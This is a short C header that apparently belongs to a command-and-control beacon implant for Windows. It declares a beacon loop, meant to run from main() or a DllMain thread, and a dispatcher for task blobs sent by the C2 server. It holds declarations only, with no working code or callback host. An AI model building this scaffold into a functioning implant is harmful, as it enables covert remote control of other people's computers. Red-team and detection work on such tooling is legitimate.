// include/beacon.h
#pragma once
#include <windows.h>

// Main beacon loop — call from main() or DllMain thread
VOID beacon_run();

// Task dispatcher — called when C2 sends a task blob
VOID dispatch_task(BYTE* taskBlob, DWORD taskBlobLen);
